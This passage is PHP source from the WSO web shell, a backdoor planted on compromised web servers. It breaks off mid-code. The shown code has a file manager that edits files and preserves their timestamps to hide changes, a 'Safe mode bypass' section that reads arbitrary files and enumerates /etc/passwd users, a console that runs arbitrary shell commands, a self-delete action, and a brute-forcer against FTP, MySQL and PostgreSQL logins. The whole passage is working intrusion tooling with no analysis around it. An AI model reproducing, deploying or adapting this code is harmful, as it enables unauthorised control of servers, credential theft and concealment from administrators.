&lt;form name=files method=post&gt;&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i&lt;$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' =&gt; $dirContent[$i],
					 'path' =&gt; $GLOBALS['cwd'].$dirContent[$i],
					 'modify' =&gt; date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
					 'perms' =&gt; wsoPermsColor($GLOBALS['cwd'].$dirContent[$i]),
					 'size' =&gt; @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' =&gt; $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' =&gt; $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
			$files[] = array_merge($tmp, array('type' =&gt; 'file'));
		elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' =&gt; 'link'));
		elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' =&gt; 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] &lt; $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '&lt;tr'.($l?' class=l1':'').'&gt;&lt;td&gt;&lt;input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')"&gt;'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"&gt;&lt;b&gt;[ '.htmlspecialchars($f['name']).' ]&lt;/b&gt;').'&lt;/a&gt;&lt;/td&gt;&lt;td&gt;'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'&lt;/td&gt;&lt;td&gt;'.$f['modify'].'&lt;/td&gt;&lt;td&gt;'.$f['owner'].'/'.$f['group'].'&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')"&gt;'.$f['perms']
			.'&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')"&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')"&gt;D&lt;/a&gt;':'').'&lt;/td&gt;&lt;/tr&gt;';
		$l = $l?0:1;
	}
	echo "&lt;tr&gt;&lt;td colspan=7&gt; 
	&lt;input type=hidden name=a value='FilesMan'&gt; 
	&lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt; 
	&lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'&gt; 
	&lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;";
    if(class_exists('ZipArchive'))
        echo "&lt;option value='zip'&gt;Compress (zip)&lt;/option&gt;&lt;option value='unzip'&gt;Uncompress (zip)&lt;/option&gt;";
    if(!empty($_SESSION['act'])&&@count($_SESSION['f']))
        echo "&lt;option value='paste'&gt;Paste / zip&lt;/option&gt;";
    echo "&lt;/select&gt;&nbsp;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;";
	wsoFooter();
}
 
function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i&lt;strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}

	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}

	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}

	$stringTools = array(

		'Base64 encode' =&gt; 'base64_encode',
		'Base64 decode' =&gt; 'base64_decode',
		'Url encode' =&gt; 'urlencode',
		'Url decode' =&gt; 'urldecode',
		'Full urlencode' =&gt; 'full_urlencode',
		'md5 hash' =&gt; 'md5',
		'sha1 hash' =&gt; 'sha1',
		'crypt' =&gt; 'crypt',
		'CRC32' =&gt; 'crc32',
		'ASCII to HEX' =&gt; 'ascii2hex',
		'HEX to ASCII' =&gt; 'hex2ascii',
		'HEX to DEC' =&gt; 'hexdec',
		'HEX to BIN' =&gt; 'hex2bin',
		'DEC to HEX' =&gt; 'dechex',
		'DEC to BIN' =&gt; 'decbin',
		'BIN to HEX' =&gt; 'binhex',
		'BIN to DEC' =&gt; 'bindec',
		'String to lower case' =&gt; 'strtolower',
		'String to upper case' =&gt; 'strtoupper',
		'Htmlspecialchars' =&gt; 'htmlspecialchars',
		'String length' =&gt; 'strlen',
	);
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'&#92;&#48;")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
	echo '&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "&lt;form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'&gt;&lt;select name='selectTool'&gt;";
	foreach($stringTools as $k =&gt; $v)
		echo "&lt;option value='".htmlspecialchars($v)."'&gt;".$k."&lt;/option&gt;";
		echo "&lt;/select&gt;&lt;input type='submit' value='&gt;&gt;'/&gt; &lt;input type=checkbox name=ajax value=1 ".(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."&gt; send using AJAX&lt;br&gt;&lt;textarea name='input' style='margin-top:5px' class=bigarea&gt;".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."&lt;/textarea&gt;&lt;/form&gt;&lt;pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'&gt;";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search text in files:&lt;/h1&gt;&lt;div class=content&gt; 
		&lt;form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"&gt;&lt;table cellpadding='1' cellspacing='0' width='50%'&gt; 
			&lt;tr&gt;&lt;td width='1%'&gt;Text:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='text' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt; 
			&lt;tr&gt;&lt;td&gt;Path:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt; 
			&lt;tr&gt;&lt;td&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='filename' value='*' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt; 
			&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt; 
			&lt;/table&gt;&lt;/form&gt;";
 
	function wsoRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $item) {
				if(@is_dir($item)){
					if($path!=$item)
						wsoRecursiveGlob($item);
				} else {
					if(@strpos(@file_get_contents($item), @$_POST['p2'])!==false)
						echo "&lt;a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\")'&gt;".htmlspecialchars($item)."&lt;/a&gt;&lt;br&gt;";
				}
			}
		}
	}
	if(@$_POST['p3'])
		wsoRecursiveGlob($_POST['c']);
	echo "&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt; 
		&lt;form method='post' target='_blank' name='hf'&gt; 
			&lt;input type='text' name='hash' style='width:200px;'&gt;&lt;br&gt; 
			&lt;input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"&gt;&lt;br&gt; 
			&lt;input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"&gt;&lt;br&gt; 
			&lt;input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"&gt;&lt;br&gt; 
			&lt;input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"&gt;&lt;br&gt; 
			&lt;input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"&gt;&lt;br&gt; 
		&lt;/form&gt;&lt;/div&gt;";
	wsoFooter();
}
 
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: ".$type);
			}
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	wsoHeader();
	echo '&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		wsoFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '&lt;span&gt;Name:&lt;/span&gt; '.htmlspecialchars(@basename($_POST['p1'])).' &lt;span&gt;Size:&lt;/span&gt; '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' &lt;span&gt;Permission:&lt;/span&gt; '.wsoPermsColor($_POST['p1']).' &lt;span&gt;Owner/Group:&lt;/span&gt; '.$uid['name'].'/'.$gid['name'].'&lt;br&gt;';
	echo '&lt;span&gt;Create time:&lt;/span&gt; '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' &lt;span&gt;Access time:&lt;/span&gt; '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' &lt;span&gt;Modify time:&lt;/span&gt; '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'&lt;br&gt;&lt;br&gt;';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '&lt;a href=# onclick="g(null,null,null,\''.strtolower($v).'\')"&gt;'.((strtolower($v)==@$_POST['p2'])?'&lt;b&gt;[ '.$v.' ]&lt;/b&gt;':$v).'&lt;/a&gt; ';
	echo '&lt;br&gt;&lt;br&gt;';
	switch($_POST['p2']) {
		case 'view':
			echo '&lt;pre class=ml1&gt;';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '&lt;/pre&gt;';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '&lt;div class=ml1 style="background-color: #e1e1e1;color:black;"&gt;';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('&lt;span ','&gt;&lt;/span&gt;'), array('&lt;font ','&gt;&lt;/font&gt;'),$code).'&lt;/div&gt;';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i&gt;=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value="";&lt;/script&gt;';
			}
			clearstatcache();
			echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.chmod.value);return false;"&gt;&lt;input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!&lt;br&gt;&lt;script&gt;p3_="";&lt;/script&gt;';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '&lt;form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"&gt;&lt;textarea name=text class=bigarea&gt;';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '&lt;/textarea&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000&lt;br&gt;','','');
			$len = strlen($c);
			for ($i=0; $i&lt;$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 &lt; $len) {$h[0] .= sprintf('%08X',$i+1).'&lt;br&gt;';}
					$h[1] .= '&lt;br&gt;';
					$h[2] .= "\n";
				}
		 	}
			echo '&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style="font-weight: normal;"&gt;&lt;pre&gt;'.$h[0].'&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;'.$h[1].'&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;'.htmlspecialchars($h[2]).'&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!&lt;br&gt;';
				else
					die('&lt;script&gt;g(null,null,"'.urlencode($_POST['p3']).'",null,"")&lt;/script&gt;');
			}
			echo '&lt;form onsubmit="g(null,null,null,null,this.name.value);return false;"&gt;&lt;input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.touch.value);return false;"&gt;&lt;input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}
 
function actionSafeMode() {
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."\n";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."\x00".preg_replace('!\(\d+\)\s.*!', '', __FILE__));
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] &lt;= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."\n";
			}
			break;
	}
	$temp = ob_get_clean();
	wsoHeader();
	echo '&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;';
	echo '&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"1",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"2",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"3",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"4",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid ("Read" /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
	if($temp)
		echo '&lt;pre class="ml1" style="margin-top:5px" id="Output"&gt;'.htmlspecialchars($temp).'&lt;/pre&gt;';
	echo '&lt;/div&gt;';
	wsoFooter();
}
 
function actionConsole() {
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		echo "document.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".wsoEx($_POST['p1']),"\n\r\t\\'&#92;&#48;"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
			}
		}
		echo "document.cf.output.value+='".$temp."';";
		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
    echo "&lt;script&gt; 
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur&gt;=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur &lt; cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
&lt;/script&gt;";
	echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"&gt;&lt;select name=alias&gt;';
	foreach($GLOBALS['aliases'] as $n =&gt; $v) {
		if($v == '') {
			echo '&lt;optgroup label="-'.htmlspecialchars($n).'-"&gt;&lt;/optgroup&gt;';
			continue;
		}
		echo '&lt;option value="'.htmlspecialchars($v).'"&gt;'.$n.'&lt;/option&gt;';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo '&lt;/select&gt;&lt;input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value="&gt;&gt;"&gt; &lt;input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX&lt;br/&gt;&lt;textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly&gt;';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
	}
	echo '&lt;/textarea&gt;&lt;input type=text name=cmd style="border-top:0;width:100%;margin:0;" onkeydown="kp(event);"&gt;';
	echo '&lt;/form&gt;&lt;/div&gt;&lt;script&gt;document.cf.cmd.focus();&lt;/script&gt;';
	wsoFooter();
}
 
function actionLogout() {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	die('bye!');
}
 
function actionSelfRemove() {
 
	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        wsoHeader();
	echo '&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick="g(null,null,\'yes\')"&gt;Yes&lt;/a&gt;&lt;/div&gt;';
	wsoFooter();
}
 
function actionBruteforce() {
	wsoHeader();
	if( isset($_POST['proto']) ) {
		echo '&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; '.htmlspecialchars($_POST['proto']).' &lt;span&gt;Server:&lt;/span&gt; '.htmlspecialchars($_POST['server']).'&lt;br&gt;';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($line[0]).'&lt;br&gt;';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i&gt;=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '&lt;b&gt;'.htmlspecialchars($_POST['login']).'&lt;/b&gt;:'.htmlspecialchars($line).'&lt;br&gt;';
					}
				}
		}
		echo "&lt;span&gt;Attempts:&lt;/span&gt; $attempts &lt;span&gt;Success:&lt;/span&gt; $success&lt;/div&gt;&lt;br&gt;";
	}
	echo '&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;'
		.'&lt;input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"&gt;'
		.'&lt;input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'"&gt;'
		.'&lt;input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'"&gt;'
		.'&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;input type=text name=server value="127.0.0.1"&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="1" checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style="padding-left:15px"&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="2"&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style="padding-left:15px"&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;input type=text name=login value="root"&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;'
